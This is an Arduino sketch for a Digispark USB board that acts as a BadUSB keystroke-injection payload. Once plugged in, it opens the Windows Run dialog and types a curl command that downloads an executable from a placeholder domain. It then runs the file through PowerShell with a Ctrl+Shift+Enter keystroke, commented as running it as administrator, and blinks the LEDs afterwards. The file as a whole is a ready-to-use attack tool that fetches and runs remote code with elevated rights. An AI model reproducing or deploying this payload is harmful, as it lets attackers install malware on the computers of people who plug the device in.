#include "DigiKeyboard.h"

void setup() {
    pinMode(0, OUTPUT);
    pinMode(1, OUTPUT);
    //Donwload executable 
    DigiKeyboard.delay(100); 
    DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_RIGHT); 
    DigiKeyboard.delay(270); 
    DigiKeyboard.print("curl -o %USERPROFILE%\\Downloads\\file.exe https://YourDomain/youfile.exe"); 
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(30000);
    //Run executable 
    DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_RIGHT);    
    DigiKeyboard.delay(270);  
    DigiKeyboard.print("powershell Start-Process -FilePath %USERPROFILE%\\Downloads\\file.exe"); 
    DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT); //This will run script as administrator
}
void loop() {
    digitalWrite(1, HIGH);
    digitalWrite(0, HIGH);   
    delay(500);  
    digitalWrite(1, LOW);   
    digitalWrite(0, LOW); 
    delay(500); 
    //Blinking after code execution   
} 

